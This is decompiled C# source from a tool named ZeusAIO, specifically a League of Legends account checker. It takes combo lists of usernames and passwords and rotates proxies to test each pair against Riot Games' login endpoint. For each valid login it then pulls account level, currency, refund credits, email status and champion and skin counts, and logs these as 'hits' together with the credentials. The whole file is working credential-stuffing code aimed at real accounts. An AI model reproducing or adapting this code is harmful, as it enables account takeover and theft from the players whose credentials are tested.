// Decompiled with JetBrains decompiler
// Type: Leagueoflegends.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace Leagueoflegends
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=EUW1|" + s[0] + "&password=" + s[1] + "&scope=openid offline_access lol ban profile email phone";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source1 = httpRequest.Post("https://auth.riotgames.com/token", str1, "application/x-www-form-urlencoded").ToString();
              if (!source1.Contains("invalid_credentials"))
              {
                if (source1.Contains("access_token"))
                {
                  string str2 = Check.Parse(source1, "access_token\":\"", "\",\"");
                  httpRequest.AddHeader("Authorization", "Bearer " + str2);
                  string source2 = httpRequest.Get("https://store.euw1.lol.riotgames.com/storefront/v3/history/purchase?language=de_DE").ToString();
                  if (source2.Contains("accountId"))
                  {
                    string str3 = Check.Parse(source2, "summonerLevel\":", "}");
                    string str4 = Check.Parse(source2, "ip\":", ",\"");
                    string str5 = Check.Parse(source2, "rp\":", ",\"");
                    string str6 = Check.Parse(source2, "refundCreditsRemaining\":", ",\"");
                    httpRequest.AddHeader("Authorization", "Bearer " + str2);
                    string str7 = Check.Parse(httpRequest.Get("https://email-verification.riotgames.com/api/v1/account/status").ToString(), "emailVerified\":", "}");
                    httpRequest.AddHeader("Authorization", "Bearer " + str2);
                    int count = Regex.Matches(Check.Parse(httpRequest.Get("https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION&language=en_US").ToString(), "items\":{\"", "false}]"), "itemId\":").Count;
                    string str8 = count.ToString();
                    httpRequest.AddHeader("Authorization", "Bearer " + str2);
                    count = Regex.Matches(Check.Parse(httpRequest.Get("https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION_SKIN&language=en_US").ToString(), "items\":{\"", "false}]"), "itemId\":").Count;
                    string str9 = count.ToString();
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - LOL EUW] " + s[0] + ":" + s[1] + " | Level: " + str3 + " | BE: " + str4 + " | Rp: " + str5 + " | RefundsRemaing: " + str6 + " | EmailVerified: " + str7 + " | Champs " + str8 + " | Skins: " + str9, Color.Green);
                    ++mainmenu.hits;
                    Export.AsResult("/Lol(euw)_hits", s[0] + ":" + s[1] + " | Level: " + str3 + " | BE: " + str4 + " | Rp: " + str5 + " | RefundsRemaing: " + str6 + " | EmailVerified: " + str7 + " | Champs " + str8 + " | Skins: " + str9);
                    return false;
                  }
                  break;
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
